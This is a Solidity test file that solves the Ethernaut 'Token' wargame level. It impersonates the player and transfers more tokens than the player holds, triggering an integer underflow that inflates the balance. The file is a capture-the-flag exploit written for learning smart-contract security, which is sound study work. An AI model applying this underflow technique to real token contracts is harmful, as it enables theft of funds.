// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {DSTest} from "ds-test/test.sol";
import {Token} from "ethernaut/contracts/src/levels/Token.sol";
import {TokenFactory} from "ethernaut/contracts/src/levels/TokenFactory.sol";

interface Vm {
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

contract TokenTest is DSTest {
    address internal constant VM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
    Vm internal constant vm = Vm(VM_ADDRESS);

    address public immutable player = address(0xdead);
    TokenFactory public factory;
    Token public level;

    function setUp() public {
        factory = new TokenFactory();
        level = Token(factory.createInstance(player));
    }

    function test_exploit_Token() public {
        assertEq(level.balanceOf(player), 20);
        vm.startPrank(player);
        level.transfer(address(level), 21);
        uint256 balance = level.balanceOf(player);
        vm.stopPrank();
        assertGt(level.balanceOf(player), 20);
    }
}
